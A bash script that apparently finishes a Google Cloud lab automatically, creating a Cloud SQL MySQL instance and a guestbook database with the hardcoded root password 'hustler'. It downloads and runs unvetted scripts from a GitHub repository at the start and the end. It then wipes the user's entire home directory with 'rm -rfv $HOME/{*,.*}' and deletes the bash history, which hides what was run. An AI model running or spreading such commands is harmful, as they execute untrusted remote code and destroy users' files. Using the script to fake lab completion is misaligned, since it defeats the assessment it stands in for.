curl -LO https://raw.githubusercontent.com/Cloud-Hustlers/content/main/creativity/welcome.sh
if [[ ! -f welcome.sh ]]; then
  echo "Download failed or file not found!"
  exit 1
fi
chmod +x welcome.sh
./welcome.sh
BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"

export PROJECT_ID=$(gcloud info --format='value(config.project)')


gcloud sql instances create myinstance \
  --root-password=hustler \
  --database-version=MYSQL_8_0 \
  --tier=db-n1-standard-4 \
  --region="${ZONE%-*}"

echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"

gcloud sql databases create guestbook --instance=myinstance


echo "${GREEN}${BOLD}

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
curl -LO https://raw.githubusercontent.com/Cloud-Hustlers/content/refs/heads/main/creativity/subscribe.sh
chmod +x subscribe.sh
./subscribe.sh

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
